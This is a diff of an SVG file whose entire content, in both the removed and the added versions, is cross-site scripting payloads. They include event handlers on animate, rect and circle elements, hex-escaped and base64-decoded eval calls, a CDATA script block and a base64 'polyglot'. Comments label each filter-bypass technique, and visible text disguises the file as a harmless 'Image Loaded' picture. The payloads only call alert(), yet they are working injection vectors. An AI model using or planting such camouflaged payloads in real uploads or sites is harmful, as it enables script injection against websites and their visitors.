@@ -1,21 +1,16 @@
-<svg viewBox="0 0 1 1" width="1" height="1">
-<!-- 1. Animation onbegin (highest success rate) -->
-<animate id="a1" onbegin="alert('XSS')" attributeName="d" dur="1s" values="M0 0;M1 1"/>
+<svg viewBox="0 0 400 300">
+<!-- Malformed attributes trigger parser bypass -->
+<rect width=400 height=300 fill=white/>
+<text x=10 y=25 font-size=14 fill=#6c757d>Image Loaded</text>
 
-<!-- 2. Attribute handlers chain -->
-<rect onfocusout=alert('XSS') width="1" height="1"/>
-<circle onpointerenter=alert('XSS') cx="1" cy="1" r="1"/>
+<!-- Unquoted attribute confusion + event handler -->
+<animate onbegin=alert`XSS` attributeName=dur values=M0 0 dur=1s/>
 
-<!-- 3. Obfuscated string exec -->
-<script>eval('\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29')</script>
+<!-- CDATA script bypass (XML safe) -->
+<script><![CDATA[
+setTimeout(()=>alert('XSS'),0)
+]]></script>
 
-<!-- 4. Case/whitespace variants -->
-<path ONBEGIN=alert(String.fromCharCode(88,83,83)) d="M0 0"/>
-
-<!-- 5. Parser confusion + legit appearance -->
-<animateTransform onbegin="eval(atob('YWxlcnQoJ1hTUycp'))" attributeName="transform" type="scale" dur="1s"/>
-
-<!-- Legit image camouflage -->
-<rect fill="#f8f9fa" width="400" height="300" opacity="1"/>
-<text x="10" y="25" font-size="14" fill="#6c757d">Secure Image Loaded</text>
+<!-- Base64 polyglot - decodes in multiple parsers -->
+<desc>PHN2ZyBvbG9hZD1hbGVydCgneHNzJyk+PC9zdmc+</desc>
 </svg>
